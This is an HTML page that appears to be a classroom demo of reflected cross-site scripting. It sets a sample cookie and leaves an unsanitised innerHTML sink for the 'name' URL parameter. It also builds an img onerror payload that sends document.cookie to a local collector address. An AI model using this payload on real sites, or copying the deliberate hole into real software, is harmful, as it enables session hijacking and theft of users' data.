<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Example1</title>
</head>

<body>
    <!-- if image fails to load the src then whatever is written inside onerror will be executed
        <img src="img.gig" onerror="alert(`Image does not exist !`)"> -->
    
    <p>In this example we will see how attackers can steal the data in local storage like cookies</p>
    <div>Welcome, <span id="username"></span>!</div>


    <script>
        // suppose we have some cookies send by server to us, here for example we are setting any values
        function setCookies(name, value, days) {
            const date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // converting days to ms
            const expires = `expires=${date.toUTCString()}`;
            document.cookie = `${name}=${value};${expires};path=/`
        }

        setCookies("exampleCookie", "Hello World !", 7);

        // copy it and add as name search param
        console.log(encodeURI(`<img src="does-not-exist" onerror="var img = document.createElement('img');
            img.src = \`http://127.0.0.1:5501/cookie?data=${document.cookie}\`;
            document.querySelector('body').appendChild(img)">`));

        console.log(document.cookie)

        const params = new URLSearchParams(window.location.search); // get search params
        const name = params.get("name");
        document.getElementById("username").innerHTML = name;
    </script>

</body>

</html>